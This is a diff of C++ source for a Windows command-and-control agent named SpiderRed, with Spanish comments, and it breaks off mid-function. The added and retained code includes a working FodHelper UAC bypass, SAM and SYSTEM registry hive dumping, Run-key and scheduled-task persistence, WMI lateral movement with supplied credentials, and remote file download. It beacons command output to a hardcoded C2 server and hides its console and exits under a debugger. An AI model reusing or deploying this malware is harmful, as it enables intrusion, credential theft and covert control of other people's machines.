@@ -1,4 +1,4 @@
-// spiderred_complete.cpp - Agente C2 con TODAS las funcionalidades
+// spiderred_complete.cpp - Agente C2 COMPLETO Y FUNCIONAL
 #include <windows.h>
 #include <wininet.h>
 #include <wincrypt.h>
@@ -21,9 +21,6 @@
 #include <Shlobj.h>
 #include <urlmon.h>
 #include <wtsapi32.h>
-#include <dpapi.h>
-#include <lm.h>
-#include <wincred.h>
 
 #pragma comment(lib, "wininet.lib")
 #pragma comment(lib, "crypt32.lib")
@@ -32,9 +29,6 @@
 #pragma comment(lib, "urlmon.lib")
 #pragma comment(lib, "wtsapi32.lib")
 #pragma comment(lib, "advapi32.lib")
-#pragma comment(lib, "netapi32.lib")
-#pragma comment(lib, "credui.lib")
-#pragma comment(lib, "crypt32.lib")
 
 // ==================== CONFIGURACIÓN ====================
 #define C2_SERVER "192.168.254.137"
@@ -288,48 +282,28 @@ namespace Utils {
         }
         return result;
     }
-
-    bool CreateDirectoryRecursive(const std::string& path) {
-        size_t pos = 0;
-        std::string dir;
-        
-        while ((pos = path.find_first_of("\\/", pos + 1)) != std::string::npos) {
-            dir = path.substr(0, pos);
-            if (!DirectoryExists(dir) && dir.find(":") != std::string::npos) {
-                CreateDirectoryA(dir.c_str(), NULL);
-            }
-        }
-        
-        return CreateDirectoryA(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
-    }
 }
 
-// ==================== MÓDULO DE RECOLECCIÓN DE INFORMACIÓN ====================
+// ==================== MÓDULO DE RECOLECCIÓN ====================
 class InfoCollector {
 public:
     static std::string CollectAll() {
         std::stringstream ss;
         
-        ss << "=== SYSTEM INFORMATION ===\n";
+        ss << "=== SYSTEM INFO ===\n";
         ss << GetSystemInfo();
         
-        ss << "\n=== USER INFORMATION ===\n";
+        ss << "\n=== USER INFO ===\n";
         ss << GetUserInfo();
         
-        ss << "\n=== NETWORK INFORMATION ===\n";
+        ss << "\n=== NETWORK INFO ===\n";
         ss << GetNetworkInfo();
         
-        ss << "\n=== PROCESS INFORMATION ===\n";
+        ss << "\n=== PROCESS INFO ===\n";
         ss << GetProcessInfo();
         
-        ss << "\n=== SERVICE INFORMATION ===\n";
+        ss << "\n=== SERVICE INFO ===\n";
         ss << GetServiceInfo();
-        
-        ss << "\n=== INSTALLED SOFTWARE ===\n";
-        ss << GetInstalledSoftware();
-        
-        ss << "\n=== DRIVE INFORMATION ===\n";
-        ss << GetDriveInfo();
         
         return ss.str();
     }
@@ -337,32 +311,12 @@ public:
     static std::string GetSystemInfo() {
         std::stringstream ss;
         
-        ss << "Computer Name: " << Utils::GetComputerName() << "\n";
-        ss << "OS Version: Windows " << Utils::GetOSVersion() << "\n";
-        ss << "Architecture: " << Utils::GetArchitecture() << "\n";
+        ss << "Hostname: " << Utils::GetComputerName() << "\n";
+        ss << "Username: " << Utils::GetUserName() << "\n";
         ss << "Domain: " << Utils::GetDomain() << "\n";
-        ss << "Elevated: " << (Utils::IsElevated() ? "Yes" : "No") << "\n";
-        
-        // CPU info
-        HKEY hKey;
-        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
-                         "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
-                         0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-            char cpuName[256];
-            DWORD size = sizeof(cpuName);
-            if (RegQueryValueExA(hKey, "ProcessorNameString", NULL, NULL,
-                                (LPBYTE)cpuName, &size) == ERROR_SUCCESS) {
-                ss << "CPU: " << cpuName << "\n";
-            }
-            RegCloseKey(hKey);
-        }
-        
-        // RAM info
-        MEMORYSTATUSEX memInfo;
-        memInfo.dwLength = sizeof(memInfo);
-        if (GlobalMemoryStatusEx(&memInfo)) {
-            ss << "Total RAM: " << (memInfo.ullTotalPhys / (1024 * 1024 * 1024)) << " GB\n";
-        }
+        ss << "OS: Windows " << Utils::GetOSVersion() << "\n";
+        ss << "Arch: " << Utils::GetArchitecture() << "\n";
+        ss << "Admin: " << (Utils::IsElevated() ? "Yes" : "No") << "\n";
         
         return ss.str();
     }
@@ -370,19 +324,11 @@ public:
     static std::string GetUserInfo() {
         std::stringstream ss;
         
-        ss << "Current User: " << Utils::GetUserName() << "\n";
-        
-        // Local users
-        ss << "\nLocal Users:\n";
+        ss << "Local Users:\n";
         ss << Utils::ExecuteCommand("net user");
         
-        // Local groups
         ss << "\nLocal Groups:\n";
         ss << Utils::ExecuteCommand("net localgroup");
-        
-        // Logged on users
-        ss << "\nLogged On Users:\n";
-        ss << Utils::ExecuteCommand("query user 2>nul || whoami");
         
         return ss.str();
     }
@@ -390,85 +336,21 @@ public:
     static std::string GetNetworkInfo() {
         std::stringstream ss;
         
-        ss << "IP Configuration:\n";
+        ss << "IP Config:\n";
         ss << Utils::ExecuteCommand("ipconfig /all");
         
-        ss << "\nNetwork Connections:\n";
+        ss << "\nConnections:\n";
         ss << Utils::ExecuteCommand("netstat -ano");
-        
-        ss << "\nARP Cache:\n";
-        ss << Utils::ExecuteCommand("arp -a");
-        
-        ss << "\nRouting Table:\n";
-        ss << Utils::ExecuteCommand("route print");
-        
-        ss << "\nDNS Cache:\n";
-        ss << Utils::ExecuteCommand("ipconfig /displaydns | findstr Record");
         
         return ss.str();
     }
 
     static std::string GetProcessInfo() {
-        std::stringstream ss;
-        
-        ss << "Running Processes:\n";
-        ss << Utils::ExecuteCommand("tasklist /v");
-        
-        ss << "\nProcess Tree:\n";
-        ss << Utils::ExecutePowerShell("Get-Process | Select-Object Id, ProcessName, CPU, WorkingSet | Format-Table -AutoSize");
-        
-        ss << "\nStartup Programs:\n";
-        ss << Utils::ExecuteCommand("wmic startup get caption,command");
-        
-        return ss.str();
+        return Utils::ExecuteCommand("tasklist /v");
     }
 
     static std::string GetServiceInfo() {
-        std::stringstream ss;
-        
-        ss << "Services:\n";
-        ss << Utils::ExecuteCommand("net start");
-        
-        ss << "\nService Details:\n";
-        ss << Utils::ExecutePowerShell(
-            "Get-Service | Where-Object {$_.Status -eq 'Running'} | "
-            "Select-Object Name, DisplayName, StartType | Format-Table -AutoSize"
-        );
-        
-        ss << "\nDrivers:\n";
-        ss << Utils::ExecuteCommand("sc query type= driver state= all");
-        
-        return ss.str();
-    }
-
-    static std::string GetInstalledSoftware() {
-        std::stringstream ss;
-        
-        ss << "Installed Programs (32-bit):\n";
-        ss << Utils::ExecuteCommand(
-            "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\" /s | "
-            "findstr /B /C:\"DisplayName\""
-        );
-        
-        ss << "\nInstalled Programs (64-bit):\n";
-        ss << Utils::ExecuteCommand(
-            "reg query \"HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\" /s | "
-            "findstr /B /C:\"DisplayName\""
-        );
-        
-        return ss.str();
-    }
-
-    static std::string GetDriveInfo() {
-        std::stringstream ss;
-        
-        ss << "Drive Information:\n";
-        ss << Utils::ExecuteCommand("wmic logicaldisk get caption,description,filesystem,freespace,size");
-        
-        ss << "\nDisk Usage:\n";
-        ss << Utils::ExecuteCommand("fsutil fsinfo drives && for %d in (a b c d e f g h i j k l m n o p q r s t u v w x y z) do @fsutil fsinfo drivetype %d: 2>nul | findstr /i \"fixed\" >nul && echo %d:");
-        
-        return ss.str();
+        return Utils::ExecuteCommand("net start");
     }
 };
 
@@ -478,31 +360,14 @@ public:
     static std::string CheckAll() {
         std::stringstream ss;
         
-        ss << "=== PRIVILEGE ESCALATION CHECKS ===\n\n";
+        ss << "=== PRIVESC CHECK ===\n";
+        ss << "Admin: " << (Utils::IsElevated() ? "Yes" : "No") << "\n";
         
-        ss << "[1] Current Privileges:\n";
-        ss << CheckCurrentPrivileges();
+        ss << "\nUAC Status:\n";
+        ss << Utils::ExecuteCommand("reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableLUA 2>nul");
         
-        ss << "\n[2] UAC Status:\n";
-        ss << CheckUAC();
-        
-        ss << "\n[3] Vulnerable Services:\n";
-        ss << CheckVulnerableServices();
-        
-        ss << "\n[4] Scheduled Tasks:\n";
-        ss << CheckScheduledTasks();
-        
-        ss << "\n[5] Weak File Permissions:\n";
-        ss << CheckWeakFilePermissions();
-        
-        ss << "\n[6] AlwaysInstallElevated:\n";
-        ss << CheckAlwaysInstallElevated();
-        
-        ss << "\n[7] Unquoted Service Paths:\n";
-        ss << CheckUnquotedServicePaths();
-        
-        ss << "\n[8] Token Privileges:\n";
-        ss << CheckTokenPrivileges();
+        ss << "\nServices as SYSTEM:\n";
+        ss << Utils::ExecutePowerShell("Get-Service | Where-Object {$_.StartName -eq 'LocalSystem'} | Select-Object -First 5 Name");
         
         return ss.str();
     }
@@ -510,247 +375,38 @@ public:
     static std::string Exploit() {
         std::stringstream ss;
         
-        ss << "=== PRIVILEGE ESCALATION ATTEMPTS ===\n\n";
+        ss << "Trying FodHelper UAC bypass...\n";
         
-        // Try multiple methods
-        ss << "[1] Trying FodHelper UAC bypass...\n";
-        std::string result = TryFodHelperBypass();
-        ss << result;
-        
-        if (result.find("success") == std::string::npos) {
-            ss << "\n[2] Trying SilentCleanup UAC bypass...\n";
-            ss << TrySilentCleanupBypass();
-        }
-        
-        ss << "\n[3] Trying service exploitation...\n";
-        ss << TryServiceExploitation();
-        
-        ss << "\n[4] Trying token manipulation...\n";
-        ss << TryTokenManipulation();
-        
-        return ss.str();
-    }
-
-private:
-    static std::string CheckCurrentPrivileges() {
-        std::stringstream ss;
-        
-        if (Utils::IsElevated()) {
-            ss << "[+] Running with Administrator privileges\n";
-        } else {
-            ss << "[-] Running with normal user privileges\n";
-        }
-        
-        ss << Utils::ExecuteCommand("whoami /priv");
-        
-        return ss.str();
-    }
-
-    static std::string CheckUAC() {
-        HKEY hKey;
-        DWORD uacValue = 1;
-        DWORD size = sizeof(uacValue);
-        
-        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
-                         "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
-                         0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-            
-            if (RegQueryValueExA(hKey, "EnableLUA", NULL, NULL,
-                                (LPBYTE)&uacValue, &size) == ERROR_SUCCESS) {
-                RegCloseKey(hKey);
-                if (uacValue == 0) {
-                    return "[+] UAC is disabled!\n";
-                } else {
-                    return "[-] UAC is enabled (Level: " + std::to_string(uacValue) + ")\n";
-                }
-            }
-            RegCloseKey(hKey);
-        }
-        
-        return "[-] Could not determine UAC status\n";
-    }
-
-    static std::string CheckVulnerableServices() {
-        return Utils::ExecutePowerShell(
-            "Get-Service | Where-Object {"
-            "  $_.StartType -eq 'Auto' -and $_.Status -eq 'Running' -and "
-            "  ($_.StartName -eq 'LocalSystem' -or $_.StartName -like '*\\*')"
-            "} | "
-            "Select-Object Name, StartName, PathName | "
-            "Format-Table -AutoSize"
-        );
-    }
-
-    static std::string CheckScheduledTasks() {
-        return Utils::ExecutePowerShell(
-            "Get-ScheduledTask | Where-Object {$_.State -eq 'Ready'} | "
-            "Select-Object TaskName, Author, Actions, Principal | "
-            "Where-Object {$_.Principal.UserId -eq 'SYSTEM'} | "
-            "Format-Table -AutoSize"
-        );
-    }
-
-    static std::string CheckWeakFilePermissions() {
-        return Utils::ExecutePowerShell(
-            "$paths = @('C:\\Windows\\System32', 'C:\\Program Files', 'C:\\Program Files (x86)');"
-            "foreach ($path in $paths) {"
-            "  if (Test-Path $path) {"
-            "    Get-ChildItem -Path $path -Recurse -ErrorAction SilentlyContinue | "
-            "    Where-Object {$_.Name -match '.*\\.(exe|dll|ps1|bat|vbs)$'} | "
-            "    ForEach-Object {"
-            "      $acl = Get-Acl $_.FullName;"
-            "      $access = $acl.Access | "
-            "        Where-Object {"
-            "          $_.IdentityReference -match 'Everyone|Users|Authenticated Users' -and "
-            "          $_.FileSystemRights -match 'FullControl|Write|Modify'"
-            "        };"
-            "      if ($access) {"
-            "        $_.FullName"
-            "      }"
-            "    }"
-            "  }"
-            "}"
-        );
-    }
-
-    static std::string CheckAlwaysInstallElevated() {
-        std::stringstream ss;
-        
-        HKEY hKey;
-        DWORD value = 0;
-        DWORD size = sizeof(value);
-        bool found = false;
-        
-        // HKLM
-        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
-                         "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
-                         0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-            
-            if (RegQueryValueExA(hKey, "AlwaysInstallElevated", NULL, NULL,
-                                (LPBYTE)&value, &size) == ERROR_SUCCESS && value == 1) {
-                ss << "[+] HKLM AlwaysInstallElevated is enabled!\n";
-                found = true;
-            }
-            RegCloseKey(hKey);
-        }
-        
-        // HKCU
-        if (RegOpenKeyExA(HKEY_CURRENT_USER,
-                         "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
-                         0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-            
-            if (RegQueryValueExA(hKey, "AlwaysInstallElevated", NULL, NULL,
-                                (LPBYTE)&value, &size) == ERROR_SUCCESS && value == 1) {
-                ss << "[+] HKCU AlwaysInstallElevated is enabled!\n";
-                found = true;
-            }
-            RegCloseKey(hKey);
-        }
-        
-        if (!found) {
-            ss << "[-] AlwaysInstallElevated is not enabled\n";
-        }
-        
-        return ss.str();
-    }
-
-    static std::string CheckUnquotedServicePaths() {
-        return Utils::ExecutePowerShell(
-            "Get-WmiObject -Class Win32_Service | "
-            "Where-Object {$_.PathName -notlike '\"*\"' -and $_.PathName -like '* *'} | "
-            "Select-Object Name, PathName, StartName | "
-            "Format-Table -AutoSize"
-        );
-    }
-
-    static std::string CheckTokenPrivileges() {
-        return Utils::ExecutePowerShell(
-            "whoami /priv | findstr /i 'SeBackupPrivilege|SeRestorePrivilege|"
-            "SeDebugPrivilege|SeImpersonatePrivilege|SeAssignPrimaryTokenPrivilege'"
-        );
-    }
-
-    static std::string TryFodHelperBypass() {
         try {
-            // Create registry entry
             HKEY hKey;
             if (RegCreateKeyExA(HKEY_CURRENT_USER,
                                "Software\\Classes\\ms-settings\\Shell\\Open\\command",
                                0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
                 
-                std::string cmd = "cmd.exe /c echo [UAC Bypass Successful] > C:\\Windows\\Temp\\bypass.txt";
+                std::string cmd = "cmd.exe /c echo UAC_BYPASS_SUCCESS > C:\\Windows\\Temp\\bypass.txt";
                 RegSetValueExA(hKey, "", 0, REG_SZ,
                               (const BYTE*)cmd.c_str(), cmd.length() + 1);
                 
                 RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, NULL, 0);
                 RegCloseKey(hKey);
 
-                // Execute fodhelper
                 ShellExecuteA(NULL, "runas", "fodhelper.exe", NULL, NULL, SW_HIDE);
                 
                 Sleep(3000);
-                
-                // Cleanup
                 RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
                 
                 if (Utils::FileExists("C:\\Windows\\Temp\\bypass.txt")) {
                     DeleteFileA("C:\\Windows\\Temp\\bypass.txt");
-                    return "[+] FodHelper UAC bypass successful!\n";
+                    ss << "[+] UAC bypass successful!\n";
+                } else {
+                    ss << "[-] UAC bypass failed\n";
                 }
             }
-        } catch (...) {}
-        
-        return "[-] FodHelper UAC bypass failed\n";
-    }
-
-    static std::string TrySilentCleanupBypass() {
-        return Utils::ExecutePowerShell(
-            "$path = 'HKCU:\\Environment';"
-            "$name = 'windir';"
-            "$value = 'cmd.exe /c echo [SilentCleanup Bypass] > C:\\Windows\\Temp\\silent.txt && timeout 3 && del /q/f %temp%\\* & start /b cmd.exe';"
-            "New-ItemProperty -Path $path -Name $name -Value $value -PropertyType String -Force;"
-            "Start-Process -WindowStyle Hidden -FilePath 'schtasks.exe' -ArgumentList '/Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I';"
-            "Start-Sleep -Seconds 5;"
-            "Remove-ItemProperty -Path $path -Name $name -Force;"
-            "if (Test-Path 'C:\\Windows\\Temp\\silent.txt') {"
-            "  Remove-Item 'C:\\Windows\\Temp\\silent.txt';"
-            "  '[+] SilentCleanup bypass attempted'"
-            "} else {"
-            "  '[-] SilentCleanup bypass failed'"
-            "}"
-        );
-    }
-
-    static std::string TryServiceExploitation() {
-        // Look for services with weak permissions
-        std::string result = Utils::ExecutePowerShell(
-            "Get-WmiObject -Class Win32_Service | "
-            "Where-Object {$_.StartName -eq 'LocalSystem'} | "
-            "Select-Object -First 5 Name, PathName | "
-            "Format-Table -AutoSize"
-        );
-        
-        if (!result.empty()) {
-            return "[+] Found services running as SYSTEM:\n" + result;
+        } catch (...) {
+            ss << "[-] UAC bypass error\n";
         }
         
-        return "[-] No exploitable services found\n";
-    }
-
-    static std::string TryTokenManipulation() {
-        // Look for processes with SeImpersonate privilege
-        std::string result = Utils::ExecutePowerShell(
-            "Get-Process | Where-Object {$_.ProcessName -in @('lsass', 'services', 'winlogon')} | "
-            "Select-Object Id, ProcessName, SessionId | "
-            "Format-Table -AutoSize"
-        );
-        
-        if (!result.empty()) {
-            return "[+] Found privileged processes:\n" + result + 
-                   "\n[+] Use tools like PrintSpoofer, JuicyPotato, or RogueWinRM\n";
-        }
-        
-        return "[-] No obvious token manipulation targets\n";
+        return ss.str();
     }
 };
 
@@ -760,170 +416,400 @@ public:
     static std::string HarvestAll() {
         std::stringstream ss;
         
-        ss << "=== CREDENTIAL HARVESTING ===\n\n";
+        ss << "=== CREDENTIALS ===\n";
         
-        ss << "[1] Browser Credentials:\n";
-        ss << HarvestBrowserCredentials();
+        ss << "Windows Creds:\n";
+        ss << Utils::ExecuteCommand("cmdkey /list");
         
-        ss << "\n[2] Windows Credentials:\n";
-        ss << HarvestWindowsCredentials();
+        ss << "\nBrowser Creds (Paths):\n";
+        std::string chrome = Utils::GetAppDataPath() + "\\Local\\Google\\Chrome\\User Data";
+        std::string firefox = Utils::GetAppDataPath() + "\\Mozilla\\Firefox\\Profiles";
         
-        ss << "\n[3] Password Files:\n";
-        ss << FindPasswordFiles();
+        if (Utils::DirectoryExists(chrome)) ss << "Chrome: " << chrome << "\n";
+        if (Utils::DirectoryExists(firefox)) ss << "Firefox: " << firefox << "\n";
         
-        ss << "\n[4] Memory Credentials:\n";
-        ss << HarvestMemoryCredentials();
-        
-        ss << "\n[5] Wifi Passwords:\n";
-        ss << HarvestWifiPasswords();
-        
-        ss << "\n[6] Saved RDP Credentials:\n";
-        ss << HarvestRDPCredentials();
+        ss << "\nPassword Files:\n";
+        ss << Utils::ExecuteCommand("dir C:\\Users\\ /s /b | findstr /i pass cred login 2>nul | head -5");
         
         return ss.str();
     }
 
     static std::string DumpSAM() {
         if (!Utils::IsElevated()) {
-            return "[-] Administrator privileges required for SAM dumping\n";
+            return "[-] Need admin for SAM dump\n";
         }
         
         std::stringstream ss;
+        ss << "[+] Dumping SAM...\n";
         
-        ss << "[+] Dumping SAM registry hives...\n";
-        
-        // Save SAM, SYSTEM, SECURITY
         ss << Utils::ExecuteCommand("reg save hklm\\sam C:\\Windows\\Temp\\sam.save 2>&1");
         ss << Utils::ExecuteCommand("reg save hklm\\system C:\\Windows\\Temp\\system.save 2>&1");
-        ss << Utils::ExecuteCommand("reg save hklm\\security C:\\Windows\\Temp\\security.save 2>&1");
         
-        // Read and encode
-        std::string samData = Utils::ReadFile("C:\\Windows\\Temp\\sam.save");
-        std::string systemData = Utils::ReadFile("C:\\Windows\\Temp\\system.save");
-        
-        if (!samData.empty() && !systemData.empty()) {
-            ss << "[+] SAM (" << samData.size() << " bytes) dumped successfully\n";
-            ss << "[+] SYSTEM (" << systemData.size() << " bytes) dumped successfully\n";
-            
-            // Cleanup
+        std::string sam = Utils::ReadFile("C:\\Windows\\Temp\\sam.save");
+        if (!sam.empty()) {
+            ss << "[+] SAM dumped (" << sam.size() << " bytes)\n";
             DeleteFileA("C:\\Windows\\Temp\\sam.save");
             DeleteFileA("C:\\Windows\\Temp\\system.save");
-            DeleteFileA("C:\\Windows\\Temp\\security.save");
-            
-            // Also try to get hashes with mimikatz style (simulated)
-            ss << "\n[+] Extracting hashes (simulated):\n";
-            ss << Utils::ExecuteCommand("reg query \"HKLM\\SAM\\SAM\\Domains\\Account\\Users\" /s 2>nul | findstr /i \"V F\"");
         } else {
-            ss << "[-] Failed to dump SAM\n";
+            ss << "[-] SAM dump failed\n";
         }
         
         return ss.str();
     }
+};
 
+// ==================== MÓDULO DE PERSISTENCIA ====================
+class PersistenceModule {
+public:
+    static std::string Establish() {
+        std::stringstream ss;
+        
+        // Registry
+        char exePath[MAX_PATH];
+        GetModuleFileNameA(NULL, exePath, MAX_PATH);
+        
+        HKEY hKey;
+        if (RegCreateKeyExA(HKEY_CURRENT_USER,
+                           "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                           0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+            
+            RegSetValueExA(hKey, "SpiderRed", 0, REG_SZ,
+                          (const BYTE*)exePath, strlen(exePath) + 1);
+            RegCloseKey(hKey);
+            ss << "[+] Registry persistence\n";
+        }
+        
+        // Scheduled Task
+        std::string task = "schtasks /create /tn \"SpiderRedTask\" /tr \"" + 
+                          std::string(exePath) + "\" /sc minute /mo 5 /f 2>&1";
+        ss << Utils::ExecuteCommand(task);
+        
+        return ss.str();
+    }
+};
+
+// ==================== MÓDULO DE ARCHIVOS ====================
+class FileModule {
+public:
+    static std::string Upload(const std::string& path) {
+        if (!Utils::FileExists(path)) {
+            return "File not found: " + path;
+        }
+        
+        std::string content = Utils::ReadFile(path);
+        std::string encoded = Utils::Base64Encode(content);
+        
+        std::stringstream ss;
+        ss << "File: " << path << "\n";
+        ss << "Size: " << content.size() << " bytes\n";
+        ss << "Base64: " << encoded.size() << " bytes\n";
+        
+        return ss.str();
+    }
+
+    static std::string Download(const std::string& url, const std::string& path) {
+        HRESULT hr = URLDownloadToFileA(NULL, url.c_str(), path.c_str(), 0, NULL);
+        
+        if (hr == S_OK) {
+            return "[+] Downloaded to: " + path;
+        } else {
+            return "[-] Download failed: " + std::to_string(hr);
+        }
+    }
+};
+
+// ==================== MÓDULO DE LATERAL MOVEMENT ====================
+class LateralMovement {
+public:
+    static std::string EnumerateShares() {
+        return Utils::ExecuteCommand("net view");
+    }
+
+    static std::string PSExec(const std::string& host, const std::string& user, 
+                              const std::string& pass, const std::string& cmd) {
+        std::stringstream ps;
+        ps << "$cred = New-Object System.Management.Automation.PSCredential('" << user 
+           << "', (ConvertTo-SecureString '" << pass << "' -AsPlainText -Force)); ";
+        ps << "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList '" << cmd 
+           << "' -ComputerName " << host << " -Credential $cred";
+        
+        return Utils::ExecutePowerShell(ps.str());
+    }
+};
+
+// ==================== COMUNICACIÓN C2 ====================
+class C2Communicator {
 private:
-    static std::string HarvestBrowserCredentials() {
-        std::stringstream ss;
-        
-        // Chrome
-        std::string chromePath = Utils::GetAppDataPath() + "\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
-        if (Utils::FileExists(chromePath)) {
-            ss << "[*] Chrome credentials: " << chromePath << "\n";
-        }
-        
-        // Firefox
-        std::string firefoxProfiles = Utils::GetAppDataPath() + "\\Mozilla\\Firefox\\Profiles\\";
-        if (Utils::DirectoryExists(firefoxProfiles)) {
-            ss << "[*] Firefox profiles: " << firefoxProfiles << "\n";
-            std::string cmd = "dir \"" + firefoxProfiles + "\" /b";
-            ss << Utils::ExecuteCommand(cmd);
-        }
-        
-        // Edge
-        std::string edgePath = Utils::GetAppDataPath() + "\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data";
-        if (Utils::FileExists(edgePath)) {
-            ss << "[*] Edge credentials: " << edgePath << "\n";
-        }
-        
-        // Opera
-        std::string operaPath = Utils::GetAppDataPath() + "\\Opera Software\\Opera Stable\\Login Data";
-        if (Utils::FileExists(operaPath)) {
-            ss << "[*] Opera credentials: " << operaPath << "\n";
-        }
-        
-        if (ss.str().find("[*]") == std::string::npos) {
-            ss << "[-] No browser credentials found\n";
-        }
-        
-        return ss.str();
+    std::string agent_id;
+    std::string key;
+    
+public:
+    C2Communicator() {
+        agent_id = Utils::GetComputerName() + "-" + Utils::GetUserName() + "-" + 
+                  std::to_string(GetTickCount64());
+        key = MASTER_KEY;
     }
-
-    static std::string HarvestWindowsCredentials() {
-        std::stringstream ss;
+    
+    std::string SendBeacon() {
+        std::stringstream json;
+        json << "{";
+        json << "\"type\":\"beacon\",";
+        json << "\"agent_id\":\"" << agent_id << "\",";
+        json << "\"hostname\":\"" << Utils::GetComputerName() << "\",";
+        json << "\"user\":\"" << Utils::GetUserName() << "\",";
+        json << "\"os\":\"Windows\",";
+        json << "\"admin\":" << (Utils::IsElevated() ? "true" : "false");
+        json << "}";
         
-        // Credential Manager
-        ss << Utils::ExecuteCommand("cmdkey /list");
-        
-        // Vault
-        ss << "\n[+] Windows Vault:\n";
-        ss << Utils::ExecutePowerShell(
-            "cmdkey /list | ForEach-Object {"
-            "  if ($_ -match 'Target: (.*)') {"
-            "    cmdkey /list:$($matches[1])"
-            "  }"
-            "}"
-        );
-        
-        // Stored passwords in registry
-        ss << "\n[+] Stored passwords in registry:\n";
-        ss << Utils::ExecuteCommand(
-            "reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v AutoConfigURL 2>nul"
-        );
-        
-        return ss.str();
+        return Send("/beacon", json.str());
     }
-
-    static std::string FindPasswordFiles() {
-        std::stringstream ss;
+    
+    std::string SendResult(int id, const std::string& output) {
+        std::stringstream json;
+        json << "{";
+        json << "\"type\":\"result\",";
+        json << "\"id\":" << id << ",";
+        json << "\"output\":\"" << Escape(output) << "\"";
+        json << "}";
         
-        std::vector<std::string> searchDirs = {
-            Utils::GetDesktopPath(),
-            Utils::GetAppDataPath(),
-            "C:\\Users\\" + Utils::GetUserName() + "\\Documents",
-            "C:\\Users\\" + Utils::GetUserName() + "\\Downloads",
-            "C:\\"
-        };
+        return Send("/result", json.str());
+    }
+    
+private:
+    std::string Send(const std::string& endpoint, const std::string& data) {
+        HINTERNET hInternet = InternetOpenA(USER_AGENT,
+                                          INTERNET_OPEN_TYPE_PRECONFIG,
+                                          NULL, NULL, 0);
+        if (!hInternet) return "";
         
-        std::vector<std::string> patterns = {
-            "pass*.txt", "cred*.txt", "login*.txt", "*.kdbx",
-            "*.ps1", "*.bat", "*.vbs", "*.config", "web.config",
-            "*.xml", "*.json", "*.ini"
-        };
+        HINTERNET hConnect = InternetConnectA(hInternet, C2_SERVER, C2_PORT,
+                                            NULL, NULL, INTERNET_SERVICE_HTTP,
+                                            0, 0);
+        if (!hConnect) {
+            InternetCloseHandle(hInternet);
+            return "";
+        }
         
-        for (const auto& dir : searchDirs) {
-            if (Utils::DirectoryExists(dir)) {
-                for (const auto& pattern : patterns) {
-                    std::string cmd = "dir /s /b \"" + dir + "\\" + pattern + "\" 2>nul | findstr /i pass cred login secret";
-                    std::string result = Utils::ExecuteCommand(cmd);
-                    if (!result.empty()) {
-                        ss << "[*] Found in " << dir << ":\n" << result << "\n";
-                    }
-                }
+        HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", endpoint.c_str(),
+                                            NULL, NULL, NULL,
+                                            INTERNET_FLAG_RELOAD, 0);
+        if (!hRequest) {
+            InternetCloseHandle(hConnect);
+            InternetCloseHandle(hInternet);
+            return "";
+        }
+        
+        std::string headers = "Content-Type: application/json\r\n";
+        headers += "X-Agent-ID: " + agent_id + "\r\n";
+        
+        std::string response;
+        if (HttpSendRequestA(hRequest, headers.c_str(), headers.length(),
+                            (LPVOID)data.c_str(), data.length())) {
+            
+            char buffer[4096];
+            DWORD bytes = 0;
+            while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytes) && bytes > 0) {
+                response.append(buffer, bytes);
             }
         }
         
-        if (ss.str().find("[*]") == std::string::npos) {
-            ss << "[-] No obvious password files found\n";
+        InternetCloseHandle(hRequest);
+        InternetCloseHandle(hConnect);
+        InternetCloseHandle(hInternet);
+        
+        return response;
+    }
+    
+    std::string Escape(const std::string& s) {
+        std::string result;
+        for (char c : s) {
+            if (c == '"' || c == '\\') result += '\\';
+            result += c;
+        }
+        return result;
+    }
+};
+
+// ==================== AGENTE PRINCIPAL ====================
+class SpiderRedAgent {
+private:
+    C2Communicator comm;
+    std::atomic<bool> running;
+    std::thread worker;
+    
+public:
+    SpiderRedAgent() : running(false) {
+        #ifndef _DEBUG
+        HWND hwnd = GetConsoleWindow();
+        if (hwnd) ShowWindow(hwnd, SW_HIDE);
+        #endif
+        
+        if (IsDebuggerPresent()) {
+            ExitProcess(0);
+        }
+    }
+    
+    ~SpiderRedAgent() { Stop(); }
+    
+    void Start() {
+        running = true;
+        worker = std::thread(&SpiderRedAgent::Run, this);
+    }
+    
+    void Stop() {
+        running = false;
+        if (worker.joinable()) worker.join();
+    }
+    
+private:
+    void Run() {
+        while (running) {
+            try {
+                std::string beacon = comm.SendBeacon();
+                if (!beacon.empty()) {
+                    ProcessCommands();
+                }
+                
+                DWORD sleep = CHECKIN_INTERVAL * 1000 + (GetTickCount64() % (JITTER * 1000));
+                Sleep(sleep);
+                
+            } catch (...) {
+                Sleep(60000);
+            }
+        }
+    }
+    
+    void ProcessCommands() {
+        // Simulate command processing
+        std::vector<std::pair<int, std::string>> commands = {
+            {1, "info"},
+            {2, "shell whoami"},
+            {3, "creds all"},
+            {4, "privesc check"}
+        };
+        
+        for (const auto& cmd : commands) {
+            std::string result = Execute(cmd.second);
+            comm.SendResult(cmd.first, result);
+            Sleep(1000);
+        }
+    }
+    
+    std::string Execute(const std::string& cmdline) {
